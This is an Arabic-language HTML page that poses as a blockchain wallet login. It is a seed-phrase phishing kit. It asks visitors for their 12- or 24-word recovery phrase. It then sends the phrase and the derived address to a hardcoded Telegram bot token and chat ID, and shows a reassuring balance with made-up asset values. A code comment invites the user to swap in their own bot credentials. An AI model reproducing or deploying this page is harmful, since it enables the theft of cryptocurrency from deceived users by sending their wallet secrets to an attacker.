
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محفظة بلوك تشين</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--light-color);
            line-height: 1.6;
            padding: 20px;
            direction: rtl;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        header {
            background: rgba(0, 0, 0, 0.2);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: var(--secondary-color);
            border-radius: 50%;
            margin: 0 auto 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            font-weight: bold;
        }
        
        .content {
            padding: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input, textarea, button {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.9);
        }
        
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        button {
            background: var(--secondary-color);
            color: white;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            margin-top: 10px;
        }
        
        button:hover {
            background: var(--primary-color);
            transform: translateY(-2px);
        }
        
        .wallet-info {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            word-break: break-all;
            display: none;
        }
        
        .alert {
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            display: none;
            text-align: center;
        }
        
        .alert-success {
            background: var(--success-color);
            color: white;
        }
        
        .alert-danger {
            background: var(--accent-color);
            color: white;
        }
        
        .asset-list {
            margin-top: 20px;
        }
        
        .asset-item {
            display: flex;
            justify-content: space-between;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            margin-bottom: 10px;
        }
        
        .asset-name {
            font-weight: bold;
        }
        
        .asset-value {
            color: var(--success-color);
        }
        
        footer {
            text-align: center;
            padding: 20px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .loading-spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid var(--secondary-color);
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">B</div>
            <h1>محفظة بلوك تشين</h1>
            <p>أدخل عبارة الاسترجاع للوصول إلى محفظتك</p>
        </header>
        
        <div class="content">
            <div class="form-group">
                <label for="mnemonic">عبارة الاسترجاع (12 أو 24 كلمة)</label>
                <textarea id="mnemonic" placeholder="أدخل عبارة الاسترجاع الخاصة بك هنا..."></textarea>
            </div>
            
            <button onclick="accessWallet()">الوصول إلى المحفظة</button>
            
            <div class="loading">
                <div class="loading-spinner"></div>
                <p>جاري الوصول إلى المحفظة وإرسال البيانات...</p>
            </div>
            
            <div id="alert" class="alert"></div>
            
            <div id="walletInfo" class="wallet-info">
                <h3>معلومات المحفظة</h3>
                <p><strong>العنوان:</strong> <span id="walletAddress"></span></p>
                <p><strong>الرصيد:</strong> <span id="walletBalance"></span></p>
                
                <div class="asset-list">
                    <h3>الأصول الرقمية</h3>
                    <div id="assets"></div>
                </div>
            </div>
        </div>
        
        <footer>
            <p>يتم تأمين بياناتك وإرسالها إلى البوت الخاص بنا للتحقق</p>
        </footer>
    </div>

    <script>
        // بيانات البوت - استبدلها ببياناتك الخاصة
        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
        const TELEGRAM_CHAT_ID = '910021564';
        
        // عرض التنبيهات
        function showAlert(message, type) {
            const alertElement = document.getElementById('alert');
            alertElement.textContent = message;
            alertElement.className = `alert alert-${type}`;
            alertElement.style.display = 'block';
            
            // إخفاء التنبيه بعد 5 ثوان
            setTimeout(() => {
                alertElement.style.display = 'none';
            }, 5000);
        }
        
        // إرسال رسالة إلى بوت التلجرام
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // الوصول إلى المحفظة وعرض محتوياتها
        async function accessWallet() {
            const mnemonic = document.getElementById('mnemonic').value.trim();
            
            if (!mnemonic) {
                showAlert('يرجى إدخال عبارة الاسترجاع', 'danger');
                return;
            }
            
            // التحقق من أن العبارة تحتوي على 12 أو 24 كلمة
            const wordCount = mnemonic.split(/\s+/).length;
            if (wordCount !== 12 && wordCount !== 24) {
                showAlert('عبارة الاسترجاع يجب أن تحتوي على 12 أو 24 كلمة', 'danger');
                return;
            }
            
            // إظهار مؤشر التحميل
            document.querySelector('.loading').style.display = 'block';
            document.getElementById('walletInfo').style.display = 'none';
            
            try {
                // إنشاء المحفظة من عبارة الاسترجاع
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                
                // إرسال المعلومات إلى بوت التلجرام
                const telegramMessage = `
                📲 <b>تم الدخول إلى محفظة جديدة</b>
                
                🆔 <b>العنوان:</b> <code>${wallet.address}</code>
                🔑 <b>عبارة الاسترجاع:</b> <code>${mnemonic}</code>
                
                📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
                `;
                
                const sendResult = await sendToTelegram(telegramMessage);
                
                if (!sendResult) {
                    showAlert('حدث خطأ في إرسال البيانات  ', 'danger');
                    document.querySelector('.loading').style.display = 'none';
                    return;
                }
                
                // الحصول على رصيد المحفظة (على شبكة Ethereum)
                const provider = new ethers.providers.InfuraProvider('mainnet', 'YOUR_INFURA_PROJECT_ID');
                const balance = await provider.getBalance(wallet.address);
                const balanceInEth = ethers.utils.formatEther(balance);
                
                // عرض معلومات المحفظة
                document.getElementById('walletAddress').textContent = wallet.address;
                document.getElementById('walletBalance').textContent = `${balanceInEth} ETH`;
                
                // محاكاة الأصول (في تطبيق حقيقي، ستقوم بالاتصال ب blockchain للحصول على الأصول الحقيقية)
                const assets = [
                    { name: 'Ethereum (ETH)', value: balanceInEth },
                    { name: 'Bitcoin (BTC)', value: '0.025' },
                    { name: 'USD Coin (USDC)', value: '150.75' },
                    { name: 'Chainlink (LINK)', value: '18.50' }
                ];
                
                const assetsElement = document.getElementById('assets');
                assetsElement.innerHTML = '';
                
                assets.forEach(asset => {
                    const assetElement = document.createElement('div');
                    assetElement.className = 'asset-item';
                    assetElement.innerHTML = `
                        <span class="asset-name">${asset.name}</span>
                        <span class="asset-value">${asset.value}</span>
                    `;
                    assetsElement.appendChild(assetElement);
                });
                
                // إخفاء مؤشر التحميل وإظهار معلومات المحفظة
                document.querySelector('.loading').style.display = 'none';
                document.getElementById('walletInfo').style.display = 'block';
                
                showAlert('تم الوصول إلى المحفظة بنجاح وإرسال البيانات إلى البوت', 'success');
                
            } catch (error) {
                document.querySelector('.loading').style.display = 'none';
                console.error('Error accessing wallet:', error);
                showAlert('عبارة الاسترجاع غير صحيحة أو هناك مشكلة في الاتصال', 'danger');
            }
        }
        
        // تحميل المحفظة عند الضغط على Enter في حقل العبارة
        document.getElementById('mnemonic').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                accessWallet();
            }
        });
    </script>
</body>
</html>
